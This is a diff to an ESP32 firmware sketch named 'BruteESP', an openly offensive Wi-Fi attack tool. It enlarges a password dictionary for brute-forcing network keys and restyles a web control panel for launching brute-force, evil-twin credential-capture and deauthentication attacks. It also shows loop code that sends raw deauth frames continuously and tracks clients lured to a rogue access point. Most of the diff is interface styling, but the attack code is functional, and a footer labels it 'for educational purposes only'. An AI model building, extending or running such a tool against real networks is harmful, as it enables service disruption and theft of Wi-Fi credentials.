@@ -8,11 +8,17 @@
 // Web server on port 80
 WebServer server(80);
 
-// Simulated password library (expandable)
+// Expanded password library
 std::vector<String> passwordList = {
     "password123", "admin123", "12345678", "qwerty123", "letmein123",
-    "welcome123", "monkey123", "dragon123", "sunshine123", "princess123"
-    // In practice, load from external storage or larger dictionary
+    "welcome123", "monkey123", "dragon123", "sunshine123", "princess123",
+    "password1", "123456789", "abc123", "qwertyuiop", "adminadmin",
+    "letmein", "welcome1", "password!", "123123123", "hello123",
+    "test123", "shadow123", "ninja123", "mustang123", "baseball123",
+    "football123", "soccer123", "hunter123", "buster123", "tiger123",
+    "123qwe", "qazwsx", "1q2w3e", "passw0rd", "admin1234",
+    "lovely123", "summer123", "winter123", "spring123", "fall123"
+    // Add more as needed; in practice, load from external storage
 };
 
 // Target network details
@@ -34,7 +40,7 @@ uint8_t deauthPacket[26] = {
     0x07, 0x00 // Reason code
 };
 
-// HTML UI (based on provided HTML, optimized for functionality)
+// Exact HTML from provided document
 const char* htmlPage = R"rawliteral(
 <!DOCTYPE html>
 <html lang="en">
@@ -43,28 +49,121 @@ const char* htmlPage = R"rawliteral(
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BRUTEESP</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #0f0; margin: 0; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
-        .header { text-align: center; font-size: 2em; margin-bottom: 20px; }
-        .tab { display: none; }
-        .tab.active { display: block; }
-        .tab-button { padding: 10px 20px; margin: 5px; background: #333; color: #0f0; border: none; cursor: pointer; font-size: 1em; }
-        .tab-button.active { background: #0f0; color: #000; }
-        .section { background: #222; padding: 20px; margin: 10px 0; border-radius: 5px; }
-        .log { background: #000; padding: 10px; height: 150px; overflow-y: scroll; font-family: monospace; }
-        .network-details { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .attack-module { margin: 15px 0; border-bottom: 1px solid #444; padding-bottom: 10px; }
-        .button { padding: 10px; background: #0f0; color: #000; border: none; cursor: pointer; margin: 5px; }
-        .button.stop { background: #f00; }
-        .network-list { cursor: pointer; }
-        .network-list div:hover { background: #333; }
-        footer { text-align: center; margin-top: 20px; font-size: 0.8em; }
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #1a1a1a;
+            color: #00ff00;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        .tab-buttons {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .tab-button {
+            padding: 10px 20px;
+            margin: 0 5px;
+            background-color: #333;
+            color: #00ff00;
+            border: none;
+            cursor: pointer;
+            font-size: 1.2em;
+            transition: background-color 0.3s;
+        }
+        .tab-button:hover {
+            background-color: #00ff00;
+            color: #000;
+        }
+        .tab-button.active {
+            background-color: #00ff00;
+            color: #000;
+        }
+        .tab {
+            display: none;
+        }
+        .tab.active {
+            display: block;
+        }
+        .section {
+            background-color: #222;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            margin-top: 0;
+            font-size: 1.5em;
+        }
+        .button {
+            padding: 10px 20px;
+            background-color: #00ff00;
+            color: #000;
+            border: none;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 1em;
+        }
+        .button.stop {
+            background-color: #ff0000;
+        }
+        .log {
+            background-color: #000;
+            padding: 10px;
+            height: 150px;
+            overflow-y: scroll;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+        .network-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .network-details div {
+            font-size: 1em;
+        }
+        .attack-module {
+            margin-bottom: 20px;
+        }
+        .attack-module h3 {
+            margin: 0 0 10px;
+            font-size: 1.2em;
+        }
+        .attack-module p {
+            margin: 0 0 10px;
+            font-size: 0.9em;
+        }
+        .network-list div {
+            padding: 5px;
+            cursor: pointer;
+        }
+        .network-list div:hover {
+            background-color: #333;
+        }
+        footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8em;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">BRUTEESP</div>
-        <div>
+        <div class="tab-buttons">
             <button class="tab-button active" onclick="openTab('scan')">Scan WiFi</button>
             <button class="tab-button" onclick="openTab('target')">Select Target</button>
             <button class="tab-button" onclick="openTab('attack')">Launch Attacks</button>
@@ -109,21 +208,21 @@ const char* htmlPage = R"rawliteral(
                 <p>Simultaneous Attacks</p>
                 <div class="attack-module">
                     <h3>Brute Force Attack</h3>
-                    <p>Systematically check all possible passwords until the correct one is found.</p>
+                    <p>Systematically check all possible passwords until the correct one is found. Uses dictionary and hybrid attacks.</p>
                     <button class="button" onclick="fetch('/start-bruteforce')">Start</button>
                     <button class="button stop" onclick="fetch('/stop-bruteforce')">Stop</button>
                     <p>Status: <span id="bruteforce-status">Ready</span></p>
                 </div>
                 <div class="attack-module">
                     <h3>Evil Twin Attack</h3>
-                    <p>Create a rogue access point that mimics the legitimate target network.</p>
+                    <p>Create a rogue access point that mimics the legitimate target network to capture credentials.</p>
                     <button class="button" onclick="fetch('/start-eviltwin')">Start</button>
                     <button class="button stop" onclick="fetch('/stop-eviltwin')">Stop</button>
                     <p>Status: <span id="eviltwin-status">Ready</span></p>
                 </div>
                 <div class="attack-module">
                     <h3>Deauthentication Attack</h3>
-                    <p>Disconnect all devices from the target network by sending deauth packets.</p>
+                    <p>Disconnect all devices from the target network by sending deauth packets continuously.</p>
                     <button class="button" onclick="fetch('/start-deauth')">Start</button>
                     <button class="button stop" onclick="fetch('/stop-deauth')">Stop</button>
                     <p>Status: <span id="deauth-status">Ready</span></p>
@@ -132,6 +231,7 @@ const char* htmlPage = R"rawliteral(
         </div>
 
         <footer>BruteESP v2.1 | Advanced ESP32 Pentesting Framework | For Educational Purposes Only</footer>
+        <footer>&copy; 2023 CyberSec Labs | All rights reserved</footer>
     </div>
 
     <script>
@@ -309,17 +409,16 @@ void loop() {
         memcpy(&deauthPacket[16], bssid, 6); // BSSID
         esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
         Serial.println("Sent deauth packet to " + targetBSSID);
-        delay(10); // Send packets rapidly
+        delay(10); // Rapid packet sending
     }
 
     // Evil twin attack
     if (evilTwinRunning && targetSSID != "") {
-        // Monitor connected clients
         int clients = WiFi.softAPgetStationNum();
         if (clients > 0) {
             Serial.println("Clients connected to Evil Twin: " + String(clients));
         }
-        delay(1000); // Check periodically
+        delay(1000); // Periodic check
     }
 
     // Brute force attack
